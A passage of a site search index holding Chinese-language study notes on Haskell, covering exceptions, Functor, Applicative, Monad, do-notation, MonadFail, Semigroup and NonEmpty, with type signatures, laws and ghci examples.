\u4e3a\u8fd4\u56de\u503c\u7684\u7c7b\u578b\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u4e00\u4e2a\u51fd\u6570\uff0c\u5b83\u63a5\u6536\u5f02\u5e38\u5e76\u8fdb\u884c\u64cd\u4f5c\uff0c\u4f8b\u5982\uff1a import Control.Exception main = main' ` catch ` handler main' :: IO () main' = do ... handler :: Exception e => e -> IO () handler e = putStrLn \"...\" \u4e5f\u53ef\u4ee5\u5229\u7528\u5b88\u536b\uff08guard\uff09\u8bed\u6cd5\u548c System.IO.Error \u4e2d\u7684\u51fd\u6570\u6765\u5224\u65ad IO \u5f02\u5e38\u7684\u7c7b\u578b\u6765\u8fdb\u884c\u4e0d\u540c\u64cd\u4f5c\uff1a import System.Environment import System.IO.Error import Control.Exception main = toTry ` catch ` handler toTry :: IO () toTry = do ( fileName : _ ) <- getArgs contents <- readFile fileName putStrLn $ \"The file has \" ++ show ( length ( lines contents )) ++ \" lines!\" handler :: IOError -> IO () handler e | isDoesNotExistError e = putStrLn \"The file doesn't exist!\" | otherwise = ioError e \u5177\u4f53\u76f8\u5173\u5168\u90e8\u51fd\u6570\u89c1\u6587\u6863\uff1a System.IO.Error \u3001 Control.Exception","title":"Exceptions"},{"location":"cs/pl/haskell/#functors","text":"\u51fd\u5b50\uff08Functor\uff09\u662f\u4e00\u4e2a\u7c7b\u578b\u7c7b\uff08typeclass\uff09\uff0c\u548c\u5176\u4ed6\u7c7b\u578b\u7c7b\u4e00\u6837\uff0c\u5b83\u89c4\u5b9a\u4e86\u5176\u5b9e\u4f8b\u7c7b\u5fc5\u987b\u5b9e\u73b0\u7684\u529f\u80fd\uff08\u4f8b\u5982 Eq \u7c7b\u578b\u7c7b\u89c4\u5b9a\u4e86\u5b83\u7684\u5b9e\u4f8b\u5fc5\u987b\u662f\u53ef\u4ee5\u6bd4\u8f83\u662f\u5426\u76f8\u7b49\u7684\uff09\uff0cFunctor \u89c4\u5b9a\u7c7b\u5b83\u7684\u5b9e\u4f8b\u5fc5\u987b\u662f\u53ef\u4ee5\u8fdb\u884c\u6620\u5c04\u7684\u3002Functor \u8981\u6c42\u4f7f\u7528 fmap :: (a -> b) -> f a -> f b \u51fd\u6570\u6765\u5b9e\u73b0\u8fd9\u4e2a\u529f\u80fd\uff0c\u5b83\u63a5\u6536\u4e00\u4e2a a -> b \u7c7b\u578b\u7684\u51fd\u6570\u3001\u4e00\u4e2a\u5185\u90e8\u5143\u7d20\u4e3a a \u7c7b\u578b\u7684\u51fd\u5b50\uff0c\u8fd4\u56de\u4e00\u4e2a\u5185\u90e8\u5143\u7d20\u4e3a b \u7c7b\u578b\u7684\u51fd\u5b50 Functor \u53ef\u4ee5\u6bd4\u4f5c\u76d2\u5b50\uff0c\u90a3 fmap \u51fd\u6570\u5c31\u76f8\u5f53\u4e8e\u7ed9\u5b9a\u4e00\u4e2a\u51fd\u6570\u548c\u4e00\u4e2a\u76d2\u5b50\uff0c\u5c06\u76d2\u5b50\u4e2d\u7684\u5168\u90e8\u5143\u7d20\u90fd\u5e94\u7528\u8fd9\u4e2a\u51fd\u6570\uff0c\u518d\u8fd4\u56de\u5e94\u7528\u51fd\u6570\u540e\u7684\u76d2\u5b50 \u51fd\u5b50\u7684\u5b9e\u4f8b\u5fc5\u987b\u662f\u4e00\u4e2a Kind \u4e3a * -> * \u7684\u7c7b\u578b\u6784\u9020\u5668\uff0c\u56e0\u4e3a\u5b83\u8981\u6c42\u5176\u662f\u4e00\u4e2a\u76d2\u5b50\uff0c\u76d2\u5b50\u5728\u63a5\u6536\u5185\u5bb9\u540e\u624d\u4f1a\u6210\u4e3a\u4e00\u4e2a\u5177\u4f53\u7684\u7c7b\u578b\u3002fmap \u4e2d\u7684 f a \u548c f b \u4e5f\u662f\u56e0\u4e3a f \u662f\u4e00\u4e2a\u7c7b\u578b\u6784\u9020\u5668\uff0c\u5728\u63a5\u6536\u7c7b\u578b a/b \u540e\u624d\u4f1a\u53d8\u6210\u4e00\u4e2a\u5177\u4f53\u7c7b\u578b\uff08f a \u548c f b\uff09\u51fa\u73b0\u5728\u51fd\u6570\u7c7b\u578b\u58f0\u660e\u4e2d Functor \u7684\u5b9a\u4e49\u662f: class Functor f where fmap :: ( a -> b ) -> f a -> f b ( <$ ) :: a -> f a -> f b ( <$ ) = fmap . const \u53ef\u4ee5\u53d1\u73b0 Functor \u4e0d\u4ec5\u9700\u8981 fmap \u51fd\u6570\uff0c\u8fd8\u9700\u8981\u4e00\u4e2a <$ \u51fd\u6570\uff0c\u5b83\u63a5\u6536\u4e00\u4e2a a \u7c7b\u578b\u7684\u53d8\u91cf\u548c\u4e00\u4e2a\u5185\u5bb9\u4e3a b \u7c7b\u578b\u7684\u51fd\u5b50\uff0c\u8fd4\u56de\u4e00\u4e2a\u5185\u5bb9\u4e3a a \u7c7b\u578b\u7684\u51fd\u5b50\uff1b\u4f5c\u7528\u5c31\u662f\u5c06\u4f20\u5165\u7684\u51fd\u5b50\u4e2d\u7684\u6240\u6709\u5143\u7d20\u90fd\u66ff\u6362\u4e3a\u4f20\u5165\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\uff0c\u6bd4\u5982\uff1a ghci > 'a' <$ [ 1 , 2 , 3 ] \"aaa\" \u4f46\u5b83\u4e0d\u662f\u58f0\u660e\u4e00\u4e2a\u51fd\u5b50\u5b9e\u4f8b\u5fc5\u987b\u7684\uff0c\u56e0\u4e3a\u5b83\u53ef\u4ee5\u4f7f\u7528 fmap \u548c const \u51fd\u6570\u590d\u5408\u6765\u5b9e\u73b0\uff0c\u5176\u4e2d const \u7684\u7c7b\u578b\u7b7e\u540d\uff1a const :: a -> b -> a \u5373\u63a5\u6536\u4e24\u4e2a\u53c2\u6570\uff0c\u4f46\u59cb\u7ec8\u53ea\u8fd4\u56de\u7b2c\u4e00\u4e2a\u53c2\u6570","title":"Functors"},{"location":"cs/pl/haskell/#functor","text":"","title":"Functor \u5b9e\u4f8b"},{"location":"cs/pl/haskell/#functor-laws","text":"\u6240\u6709\u7684\u51fd\u5b50\u90fd\u5e94\u8be5\u6ee1\u8db3\u4e24\u4e2a\u5b9a\u5f8b\u3002\u8fd9\u4e24\u4e2a\u5b9a\u5f8b\u4e0d\u662f Haskell \u5f3a\u5236\u8981\u6c42\u7684\uff0c\u4f46\u5e94\u8be5\u786e\u4fdd\u4e00\u4e2a\u51fd\u5b50\u6ee1\u8db3\u8fd9\u4e24\u4e2a\u5b9a\u5f8b\uff1a fmap id = id \uff08\u5176\u4e2d id \u4e3a\u51fd\u6570 (\\x -> x) \uff09\uff1a\u5373\u5bf9\u4e00\u4e2a\u51fd\u5b50 fmap id\uff0c\u90a3\u5b83\u5e94\u8be5\u8fd4\u56de\u672c\u8eab\uff08fmap id a = id a = a\uff0ca \u4e3a\u4e00\u4e2a\u51fd\u5b50\uff09\uff0c\u6bd4\u5982\uff1a ghci > fmap id [ 1 , 2 , 3 ] [ 1 , 2 , 3 ] ghci > fmap id ( Just 2 ) Just 2 fmap (f . g) = fmap f . fmap g \uff1a\u5373\u51fd\u5b50\u7684 fmap \u652f\u6301\u7ed3\u5408\u5f8b fmap (f . g) a = fmap f . fmap g $ a = fmap f (fmap g a)\uff0c\u5176\u4e2d a \u4e3a\u4e00\u4e2a\u51fd\u5b50 fmap (f . g) (Just x) = fmap f (fmap g (Just x)) = fmap f (Just (g x)) = Just (f (g x)) ghci > fmap (( * 3 ) . ( + 100 )) ( Just 1 ) Just 303 \u6ee1\u8db3\u7b2c\u4e00\u4e2a\u5b9a\u5f8b\u7684\u51fd\u5b50\u4e00\u5b9a\u6ee1\u8db3\u7b2c\u4e8c\u4e2a\u5b9a\u5f8b\uff0c\u6240\u4ee5\u53ea\u8981\u68c0\u67e5\u51fd\u5b50\u662f\u5426\u6ee1\u8db3\u7b2c\u4e00\u4e2a\u5b9a\u5f8b\u5373\u53ef","title":"Functor Laws"},{"location":"cs/pl/haskell/#intuition","text":"\u5bf9\u4e8e\u51fd\u5b50\u548c fmap\uff0c\u6709\u4e24\u79cd\u7406\u89e3\u65b9\u6cd5 \u51fd\u5b50\u662f\u4e00\u79cd\u5bb9\u5668\uff08container\uff09\uff1bfmap \u63a5\u6536\u4e00\u4e2a\u51fd\u6570\u548c\u4e00\u4e2a\u5bb9\u5668\uff0c\u5728\u5bb9\u5668\u5185\u90e8\u5e94\u7528\u8fd9\u4e2a\u51fd\u6570\uff0c\u8fd4\u56de\u5e94\u7528\u540e\u7684\u65b0\u5bb9\u5668 \u51fd\u5b50\u662f\u4e00\u79cd\u8ba1\u7b97\u4e0a\u4e0b\u6587\uff08context\uff09\uff1bfmap \u662f\u67ef\u91cc\u5316\u7684\uff0c\u628a\u5176\u7c7b\u578b\u7b7e\u540d\u770b\u4f5c fmap :: (a -> b) -> (f a -> f b) \u2003\u2003\u63a5\u6536\u4e00\u4e2a\u51fd\u6570\u8fd4\u56de\u53e6\u4e00\u4e2a\u51fd\u6570\uff0c\u4f20\u5165\u51fd\u6570 g :: a -> b\uff0cfmap \u5c06\u5176\u8f6c\u6362\u4e3a\u65b0\u7684\u51fd\u6570 fmap g :: f a -> f b \u2003\u2003\u4f7f\u666e\u901a\u7684\u51fd\u6570 g \u53ef\u4ee5\u5728\u8ba1\u7b97\u4e0a\u4e0b\u6587 f \u4e2d\u4f7f\u7528\uff0c\u8fd9\u79cd\u8f6c\u6362\u4e5f\u88ab\u79f0\u4e3a\u63d0\u5347\uff08lift\uff09","title":"Intuition"},{"location":"cs/pl/haskell/#_10","text":"","title":"\u5e38\u7528\u51fd\u6570"},{"location":"cs/pl/haskell/#applicative-functor","text":"\u5e94\u7528\u51fd\u5b50\uff08Applicative Functor\uff09\u662f\u51fd\u5b50\u7684\u5347\u7ea7\u7248\uff0c\u5b83\u5305\u542b\u5728 Control.Applicative \u6a21\u5757\u4e2d\u3002 fmap \u8fdb\u884c\u7684\u64cd\u4f5c\u662f\u5c06\u4e00\u4e2a\u666e\u901a\u4e00\u5143\u51fd\u6570\u5e94\u7528\u5728\u4e00\u4e2a\u51fd\u5b50\u5185\u90e8\u3002\u800c\u5982\u679c\u8981\u5c06\u4e00\u4e2a\u5305\u542b\u51fd\u6570\u7684\u51fd\u5b50\u5e94\u7528\u5728\u53e6\u4e00\u4e2a\u51fd\u5b50\u4e0a\uff0cfmap \u5c31\u5904\u7406\u4e0d\u4e86\u4e86\uff0c\u4f46\u662f\u5e94\u7528\u51fd\u5b50\u7684\u65b9\u6cd5\u53ef\u4ee5\u5904\u7406\u3002\u5e94\u7528\u51fd\u5b50\u7684\u5b9a\u4e49\uff1a class Functor f => Applicative f where pure :: a -> f a ( <*> ) :: f ( a -> b ) -> f a -> f b \u5e94\u7528\u51fd\u5b50\u8981\u6c42\u5b9e\u73b0\u4e24\u4e2a\u51fd\u6570\uff1a pure :: a -> f a\uff0c\u4e0d\u96be\u7406\u89e3\uff0cpure \u63a5\u6536\u4e00\u4e2a\u503c\uff0c\u5e76\u5c06\u5176\u653e\u5728\u9ed8\u8ba4\u7684\u4e0a\u4e0b\u6587/\u5bb9\u5668\u4e2d\u3002\u5bf9\u4e8e\u5217\u8868\uff0cpure = []\uff1b\u5bf9\u4e8e Maybe\uff0cpure = Just <*> :: f (a -> b) -> f a -> f b\uff0c\u7c7b\u4f3c\u4e8e fmap :: (a -> b) -> f a -> f b\uff0c\u4f46\u4e0d\u540c\u7684\u662f <*> \u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u7684\u7c7b\u578b\u662f f (a -> b) \u4e0d\u662f a -> b\u3002\u6240\u4ee5 <*> \u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u5728\u4e0a\u4e0b\u6587\u4e2d\u7684\u51fd\u6570\uff0c\u800c\u4e0d\u662f\u4e00\u4e2a\u666e\u901a\u51fd\u6570\u3002\u6362\u53e5\u8bdd\u8bf4\uff0c<*> \u63a5\u6536\u4e00\u4e2a\u88c5\u6709\u51fd\u6570\u7684\u51fd\u5b50\u548c\u53e6\u4e00\u4e2a\u51fd\u5b50\uff0c\u5e94\u7528\u51fd\u6570\u540e\u8fd4\u56de\u65b0\u7684\u51fd\u5b50\u3002","title":"Applicative Functor"},{"location":"cs/pl/haskell/#applicative-functor_1","text":"","title":"Applicative Functor \u5b9e\u4f8b"},{"location":"cs/pl/haskell/#applicative-functor-laws","text":"\u5e94\u7528\u51fd\u5b50\u4e00\u822c\u6709\u56db\u4e2a\u5b9a\u5f8b\uff0c\u90fd\u662f\u4fdd\u8bc1 pure \u7684\u6b63\u786e\u6027\u7684\uff1a Identity law \uff1apure id <*> v = v Homomorphism \uff1apure f <*> pure x = pure (f x) Interchange \uff1au < > pure v = pure ($ v) < > u Composition \uff1au < > (v < > w) = pure (.) < > u < > v <*> w","title":"Applicative Functor Laws"},{"location":"cs/pl/haskell/#intuition_1","text":"\u7406\u89e3\u5e94\u7528\u51fd\u5b50\u7684\u65b9\u5f0f\u4e5f\u662f\u5c06\u5176\u770b\u4f5c\u662f\u8ba1\u7b97\u4e0a\u4e0b\u6587\uff08context\uff09\uff0c\u6bd4\u5982\u8981\u8ba1\u7b97\uff1a \\[ [[\\ \\ g\\ x_1\\ x_2\\ \\cdots\\ x_n\\ \\ ]] \\] \u5176\u4e2d \\(x_i\\) \u7684\u7c7b\u578b\u662f \\(f\\ t_i\\) \uff0c \\(f\\) \u662f\u5e94\u7528\u51fd\u5b50\uff08\u770b\u4f5c\u4e0a\u4e0b\u6587\uff09\u3002\u800c\u51fd\u6570 \\(g\\) \u7684\u7c7b\u578b\u662f\uff1a \\[ t_1\\to t_2\\to\\cdots\\to t_n\\to t \\] \u6240\u4ee5\u53cc\u62ec\u53f7\uff08idiom brackets\uff09\u7684\u4f5c\u7528\u662f\u5c06\u4e00\u4e2a\u666e\u901a\u51fd\u6570\u5e94\u7528\u5728\u5305\u542b\u5728\u4e0a\u4e0b\u6587\u4e2d\u7684\u53c2\u6570\u4e0a\u3002 \\(g\\ x_1\\) \u53ef\u4ee5\u901a\u8fc7 fmap \u6765\u6267\u884c\uff0c\u5c06 \\(g\\) \u63d0\u5347\uff08lift\uff09\u5230 \\(x_1\\) \u7684\u4e0a\u4e0b\u6587\u4e2d\uff0c\u7136\u540e\u5e94\u7528\u5728 \\(x_1\\) \u4e0a\u3002\u4f46\u662f fmap \u8fd4\u56de\u7684\u7ed3\u679c\u662f\u4e00\u4e2a\u51fd\u5b50\uff0c\u6362\u53e5\u8bdd\u8bf4\uff0c \\(g\\ x_1\\) \u7ed3\u679c\u7684\u7c7b\u578b\u662f\uff1a \\[ f\\ \\ (t_2\\to t_3\\to\\cdots\\to t_n\\to t) \\] \u4f46\u662f fmap \u5e76\u4e0d\u80fd\u5c06\u4e0a\u4e0b\u6587\u4e2d\u7684\u51fd\u6570\u5e94\u7528\u5728\u4e0a\u4e0b\u6587\u4e2d\u7684\u53c2\u6570\u4e0a\uff0c\u4e8e\u662f\u5e94\u7528\u51fd\u5b50\u7684 <*> \u51fd\u6570\u63d0\u4f9b\u4e86\u8fd9\u4e2a\u65b9\u6cd5\uff0c\u6240\u4ee5\u8ba1\u7b97 \\([[\\ g\\ x_1\\ x_2\\ \\cdots\\ x_n\\ ]]\\) \uff0c\u53ea\u9700\u8981\uff1a g < $> x1 < *> x2 < *> ... < *> xn \u800c pure \u51fd\u6570\u7684\u4f5c\u7528\u5c31\u662f\u5c06\u4e00\u4e2a\u4e0d\u5728\u4e0a\u4e0b\u6587\u4e2d\u7684\u503c\uff08\u51fd\u6570\u6216\u53c2\u6570\uff09\u63d0\u5347\u5230\u4e0a\u4e0b\u6587\u4e2d\uff0c\u4f46\u4e0d\u8fdb\u884c\u5176\u4ed6\u64cd\u4f5c\u3002\u6bd4\u5982\u53c2\u6570 \\(x_2\\) \u5982\u679c\u4e0d\u5728\u4e0a\u4e0b\u6587\u4e2d\uff0c\u9700\u8981\u7528 pure \u63d0\u5347\u5230\u4e0a\u4e0b\u6587\u4e2d\u624d\u80fd\u6309\u4e0a\u9762\u8ba1\u7b97\uff1a g < $> x1 < *> pure x2 < *> ... < *> xn","title":"Intuition"},{"location":"cs/pl/haskell/#_14","text":"","title":"\u5e38\u7528\u51fd\u6570"},{"location":"cs/pl/haskell/#monad","text":"\u5355\u5b50\uff08Monad\uff09\u662f\u5bf9 Applicative Functor \u7684\u6269\u5c55\uff08\u4f46\u662f\u8bde\u751f\u6bd4 Applicative \u65e9\uff09\uff0cFunctor \u7684 <$> \u51fd\u6570\u5b9e\u73b0\u4e86\u5c06\u666e\u901a\u51fd\u6570\u5e94\u7528\u5728\u4e0a\u4e0b\u6587\u503c\u4e0a\uff0cApplicative \u7684 <*> \u51fd\u6570\u5c06\u4e0a\u4e0b\u6587\u4e2d\u51fd\u6570\u5e94\u7528\u5728\u4e0a\u4e0b\u6587\u503c\u4e0a\u3002\u800c Monad \u63d0\u4f9b\u4e86\u4e00\u4e2a\u51fd\u6570 >>= \uff08bind\uff09\uff0c\u5c06\u4e00\u4e2a\u63a5\u6536\u666e\u901a\u503c\u8fd4\u56de\u4e0a\u4e0b\u6587\u503c\u7684\u51fd\u6570\u5e94\u7528\u5728\u4e0a\u4e0b\u6587\u503c\u4e0a\uff1a class Applicative m => Monad m where ( >>= ) :: m a -> ( a -> m b ) -> m b ( >> ) :: m a -> m b -> m b return :: a -> m a m >> n = m >>= \\ _ -> n return = pure return \u51fd\u6570\uff1a\u548c pure \u4e00\u6837\uff0c\u53ea\u662f\u6709\u53e6\u4e00\u4e2a\u540d\u5b57 >> \u51fd\u6570\uff1a\u63d0\u4f9b\u4e86\u9ed8\u8ba4\u7684\u5b9e\u73b0\u65b9\u6cd5\uff0c\u5b83\u7684\u4f5c\u7528\u548c Applicative \u7684 *> \u51fd\u6570\u4e00\u6837 >>= \u51fd\u6570\uff08bind\uff09\uff1a\u6bd4 Applicative \u5347\u7ea7\u7684\u51fd\u6570\uff0c\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u4e00\u4e2a\u5355\u5b50\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u4e00\u4e2a\u63a5\u6536\u503c\u8fd4\u56de\u5355\u5b50\u7684\u51fd\u6570\uff0c\u5c06\u8fd9\u4e2a\u51fd\u6570\u5e94\u7528\u5728\u7b2c\u4e00\u4e2a\u53c2\u6570\u5355\u5b50\u4e2d\u7684\u503c\u4e0a\uff0c\u5e76\u8fd4\u56de\u5f97\u5230\u7684\u65b0\u5355\u5b50","title":"Monad"},{"location":"cs/pl/haskell/#monad_1","text":"","title":"Monad \u5b9e\u4f8b"},{"location":"cs/pl/haskell/#do-notation","text":"Haskell \u7684 do \u8bed\u53e5\u4e3a\u94fe\u5f0f\u7684 >>= \u5e94\u7528\u63d0\u4f9b\u4e86\u7c7b\u4f3c\u547d\u4ee4\u5f0f\uff08imperative style\uff09\u7684\u8bed\u6cd5\u7cd6\u3002\u6bd4\u5982 a >>= \\x -> b >> c >>= \\y -> d \uff1a a >>= \\ x -> b >> c >>= \\ y -> d \u5176\u4e2d\u6709 abcd \u56db\u4e2a\u503c\uff0c\u53ef\u4ee5\u770b\u51fa a \u4e2d\u5185\u5bb9\u7ed1\u5b9a\u5230\u4e86 x \u4e0a\uff0cc \u4e2d\u5185\u5bb9\u7ed1\u5b9a\u5230\u4e86 y \u4e0a\u3002\u4f7f\u7528 do \u8bed\u53e5\u6765\u8868\u793a\u8fd9\u4e2a\u64cd\u4f5c\u53ef\u4ee5\u5199\u6210\uff1a do { x <- a ; b ; y <- c ; d } \u5176\u4e2d\u7684\u5927\u62ec\u53f7\u548c\u5206\u53f7\u53ef\u4ee5\u7701\u7565\u4e0d\u5199\uff08\u6324\u5728\u4e00\u884c\u65f6\u4e0d\u80fd\u7701\u7565\uff09\u3002do \u8bed\u53e5\u4e5f\u53ea\u662f\u4e00\u4e2a\u8bed\u6cd5\u7cd6\uff0c\u5b83\u53ef\u4ee5\u9012\u5f52\u5730\u8f6c\u6362\u6210\u666e\u901a\u7684 Monad \u64cd\u4f5c\u8bed\u53e5\uff1a do e \uff1ae do { e; ... } \uff1ae >> do { ... } do { v <- e; ... } \uff1ae >>= \\v -> do { ... } do { let ...; ... } \uff1alet ... in do { ... }","title":"do-notation"},{"location":"cs/pl/haskell/#monad-laws","text":"Left identity \uff1areturn a >>= k = k a Right identity \uff1am >>= return = m Associativity \uff1a(m >>= g) >>= h = m >>= (\\x -> g x >>= h) \u524d\u4e24\u4e2a\u5b9a\u5f8b\u5f88\u597d\u7406\u89e3\uff1a \u5c06 a \u6ce8\u5165\u4e0a\u4e0b\u6587\u4e4b\u540e\u7ed1\u5b9a\uff08bind\uff09\u7ed9\u51fd\u6570 k(:: a -> m a)\uff0c\u76f8\u5f53\u4e8e\u76f4\u63a5\u5c06 a \u76f4\u63a5\u4f20\u5165\u51fd\u6570 k \u5c06\u5df2\u7ecf\u5305\u542b\u5728\u4e0a\u4e0b\u6587\u4e2d\u7684\u503c\u7ed1\u5b9a\u7ed9 return \u51fd\u6570\uff0c\u76f8\u5f53\u4e8e\u4fdd\u6301\u4e0d\u53d8 \u7b2c\u4e09\u4e2a\u5b9a\u5f8b\u662f\u7ed3\u5408\u5f8b\uff0c\u628a\u5b83\u5199\u6210\u66f4\u50cf\u7ed3\u5408\u5f8b\u7684\u8868\u793a\u65b9\u6cd5\u662f\uff1a (m >>= (\\x -> g x)) >>= h = m >>= (\\x -> g x >>= h)","title":"Monad Laws"},{"location":"cs/pl/haskell/#intuition_2","text":"Monad \u4e5f\u53ef\u4ee5\u5f88\u81ea\u7136\u5730\u770b\u6210 Applicative \u7684\u5347\u7ea7\u7248\uff0c\u6bd4\u5982 Applicative \u7684\u64cd\u4f5c\u5168\u90e8\u662f\u56fa\u5b9a\u7684\uff0c\u800c Monad \u7684\u64cd\u4f5c\u53ef\u4ee5\u5728\u4e2d\u9014\u7a81\u7136\u6539\u53d8 \u540c\u65f6 Monad \u4e5f\u5b8c\u6210\u4e86 Functor \u548c Applicative \u65e0\u6cd5\u5b8c\u6210\u7684\u64cd\u4f5c\u3002\u6bd4\u5982\u8981\u7528 fmap \u548c\u5b9e\u73b0 >>= \u51fd\u6570\uff08\u5373\u8fbe\u6210\u64cd\u4f5c m a -> (a -> m b) -> m b\uff09\uff0c\u5148\u5047\u8bbe f :: a -> m b\uff0c\u90a3\u4e48 fmap f \u7684\u7c7b\u578b\u5c31\u4f1a\u662f m a -> m (m b)\uff0c\u5c06 m a \u5e94\u7528\u5728 fmap f \u4e0a\u4f1a\u5f97\u5230\u7ed3\u679c m (m b)\uff0c\u800c\u4e0d\u662f m b\u3002\u4f46\u662f\u76ee\u524d\u53ea\u53ef\u4ee5\u4f7f\u7528 pure \u5c06\u4e00\u4e2a\u503c\u88c5\u5165\u4e0a\u4e0b\u6587\u4e2d\uff08a -> m a\uff09\uff0c\u800c\u6ca1\u6709\u4e00\u4e2a\u51fd\u6570\u53ef\u4ee5\u4ece\u4e0a\u4e0b\u6587\u4e2d\u63d0\u53d6\u503c\uff08m a -> a\uff09\u3002\u90a3\u4e48\u5c31\u9700\u8981\u5b9a\u4e49\u4e00\u4e2a\u65b0\u7684\u51fd\u6570\u6765\u5b9e\u73b0\u8fd9\u4e2a\u64cd\u4f5c\u7684\u6548\u679c\uff08m (m b) -> m b\uff09\u3002\u56e0\u6b64 Monad \u7684\u53e6\u4e00\u4e2a\u7b49\u6548\u7684\u5b9a\u4e49\u65b9\u6cd5\u662f\uff1a class Applicative m => Monad' m where join :: m ( m a ) -> m a ( >>= ) :: m a -> ( a -> m b ) -> m b x >>= f = join $ fmap f x \u4f46\u662f\u5b9a\u4e49 >>= \u51fd\u6570\u4f1a\u66f4\u4e3a\u76f4\u89c2\u65b9\u4fbf\uff0c\u6240\u4ee5 Haskell \u91c7\u7528\u4e86\u7528 >>= \u51fd\u6570\u5b9a\u4e49 Monad \u7684\u65b9\u6cd5 \u540c\u65f6 Haskell \u8fd8\u63d0\u4f9b\u4e86 join \u51fd\u6570\u7684\u5b9a\u4e49\uff1a join :: Monad m => m ( m a ) -> m a join x = x >>= id","title":"Intuition"},{"location":"cs/pl/haskell/#_19","text":"","title":"\u5e38\u7528\u51fd\u6570"},{"location":"cs/pl/haskell/#monadfail","text":"MonadFail \u5b9a\u4e49\u5728 Control.Monad.Fail \u6a21\u5757\u4e2d\uff1a class Monad m => MonadFail m where fail :: String -> m a \u5b83\u53ea\u8981\u6c42\u5728 Monad \u7684\u57fa\u7840\u4e0a\u5b9e\u73b0 fail \u51fd\u6570\uff0c\u63a5\u6536\u4e00\u4e2a\u5b57\u7b26\u4e32\u8fd4\u56de\u4e00\u4e2a\u5355\u5b50\u3002\u8fd9\u4f1a\u4f7f\u5728 do \u8bed\u53e5\u4e2d\u4ea7\u751f\u9519\u8bef\u65f6\u76f4\u63a5\u53d8\u4e3a\u9519\u8bef\u503c\uff08\u7a7a\u503c\uff09\u4f7f\u6700\u7ec8\u7684\u8fd4\u56de\u503c\u4e3a\u9519\u8bef\u503c","title":"MonadFail"},{"location":"cs/pl/haskell/#monadfail_1","text":"instance MonadFail Maybe where fail _ = Nothing instance MonadFail [] where fail _ = [] instance MonadFail IO where fail = failIO Maybe \u548c [] \u7684 fail \u51fd\u6570\u90fd\u4e0e\u7b2c\u4e00\u4e2a\u53c2\u6570\u65e0\u5173\uff0c\u76f4\u63a5\u8fd4\u56de\u7a7a\u503c\uff08Nothing\u3001[]\uff09\uff1b\u800c IO \u7684 fail \u51fd\u6570\u76f4\u63a5\u4f7f\u7528 failIO\uff0c\u5b9e\u73b0\u65b9\u6cd5\u4e5f\u662f\u6df1\u5965\uff08\u63a5\u7740\u9003 exampleFail :: Maybe Char exampleFail = do ( x : xs ) <- Just \"\" return x ghci > exampleFail Nothing \u5728\u8fd9\u4e2a\u4f8b\u5b50\u7684 do \u8bed\u53e5\u4e2d\uff0c\u5728\u63d0\u53d6 Just \"\" \u4e2d\u7684\u503c\u65f6\u7528\u4e86\u6a21\u5f0f\u5339\u914d\uff0c\u4f46\u662f\u56e0\u4e3a\u5176\u5185\u5bb9\u4e3a\u7a7a\u5b57\u7b26\u4e32\uff0cx:xs \u5339\u914d\u4f1a\u51fa\u73b0\u9519\u8bef\uff0c\u8fd9\u65f6\u5c31\u4f1a\u89e6\u53d1 fail \u51fd\u6570\u76f4\u63a5\u8fd4\u56de Nothing","title":"MonadFail \u5b9e\u4f8b"},{"location":"cs/pl/haskell/#monadfail-law","text":"fail s >>= m = fail s","title":"MonadFail Law"},{"location":"cs/pl/haskell/#semigroup","text":"\u534a\u7fa4\uff08semigroup\uff09\u662f\u4e00\u4e2a\u96c6\u5408 \\(S\\) \uff0c\u5b83\u9700\u8981\u6307\u5b9a\u4e00\u4e2a\u4e8c\u5143\u8fd0\u7b97\u7b26 \\(\\oplus\\) \uff0c\u5e76\u4e14\u6ee1\u8db3 \\[ a\\oplus b \\in S\\quad a, b\\in S \\] \u4ee5\u53ca\u7ed3\u5408\uff08associative\uff09\u5f8b\uff1a \\[ (a\\oplus b)\\oplus c = a\\oplus (b\\oplus c) \\] \u8fd9\u4e2a\u4e8c\u5143\u8fd0\u7b97\u7b26\u5728 Haskell \u7684 Semigroup \u4e2d\u88ab\u5b9a\u4e49\u4e3a <> \u51fd\u6570\uff1a class Semigroup a where ( <> ) :: a -> a -> a sconcat :: NonEmpty a -> a sconcat ( a :| as ) = go a as where go b ( c : cs ) = b <> go c cs go b [] = b stimes :: Integarl b => b -> a -> a stimes = ... \u9664\u6b64\u4e4b\u5916\u8fd8\u6709 sconcat \u548c stimes \u51fd\u6570\uff0c\u90fd\u7ed9\u51fa\u4e86\u9ed8\u8ba4\u5b9e\u73b0\u3002\u5bf9\u4e8e\u5217\u8868\uff0c<> \u76f8\u5f53\u4e8e (++)\uff0cstimes \u76f8\u5f53\u4e8e concat . replicate\uff1a ghci > [ 1 , 2 ] <> [ 3 , 4 ] [ 1 , 2 , 3 , 4 ] ghci > sconcat $ fromList [[ 1 , 2 ], [ 3 , 4 ]] [ 1 , 2 , 3 , 4 ] ghci > stimes 3 [ 1 , 2 ] [ 1 , 2 , 1 , 2 , 1 , 2 ]","title":"Semigroup"},{"location":"cs/pl/haskell/#semigroup-law","text":"(x <> y) <> z = x <> (y <> z)","title":"Semigroup Law"},{"location":"cs/pl/haskell/#nonempty","text":"NonEmpty \u8868\u793a\u975e\u7a7a\u5217\u8868\uff0c\u5b9a\u4e49\u662f\uff1a data NonEmpty a = a :| [ a ] deriving ( Eq , Ord ) \u4f7f\u7528\u4e00\u4e2a\u5143\u7d20\u548c\u4e00\u4e2a\u5217\u8868\u7528 :| \u8fde\u63a5\u5c31\u53ef\u4ee5\u751f\u6210\u4e00\u4e2a NonEmpty \u7c7b\u578b\u7684\u5217\u8868 Data.List.NonEmpty \u6a21\u5757\u4e2d\u5b9e\u73b0\u4e86\u5f88\u591a\u666e\u901a\u5217\u8868\u6709\u7684\u51fd\u6570\uff0c\u9700\u8981 qualified import \u540e\u8c03\u7528\uff0c\u4f7f\u7528 fromList\u3001toList \u51fd\u6570\u53ef\u4ee5\u5728\u666e\u901a\u5217\u8868\u548c\u975e\u7a7a\u5217\u8868\u4e4b\u95f4\u8f6c\u6362 ghci > import qualified Data.List.NonEmpty as NE ghci > arr = NE . fromList [ 1 , 2 , 3 ] ghci > arr 1 :| [ 2 , 3 ] ghci > NE . head arr 1 ghci > NE . tail arr [ 2 , 3 